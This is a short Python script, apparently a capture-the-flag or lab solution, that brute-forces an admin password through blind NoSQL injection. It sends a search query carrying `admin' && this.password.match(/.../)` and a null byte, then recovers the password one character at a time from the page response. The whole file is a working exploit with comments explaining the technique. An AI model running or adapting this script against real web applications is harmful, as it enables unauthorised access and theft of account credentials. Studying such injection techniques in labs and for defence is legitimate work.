import requests
import string

#Test if password match /^a.$/, if it matches without the wildcard
#.. To check if it's the full password.
#Move on to the next letter if it does not match.

URL = input('Enter URL. Query in code should be changed!')

def pwcheck(brute):
	query=URL+'/?search=admin%27%20%26%26%20this.password.match(/'+brute+'/)%20%00'
	r = requests.get(query)
	data = r.content
	return ">admin<" in str(data)
#For testing URL thing works. 1st letter exist. 2nd dont.
#print(pwcheck('a'))
#print(pwcheck('idontexist'))

CHARS=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
	for c in CHARS:
		print ("Test: "+c+" for "+password)
		test = password+c
		if pwcheck("^"+test+".*$"):
			password+=c
			print(password)
			break
		elif c == CHARS[-1]:
			print(password)
			exit(0)
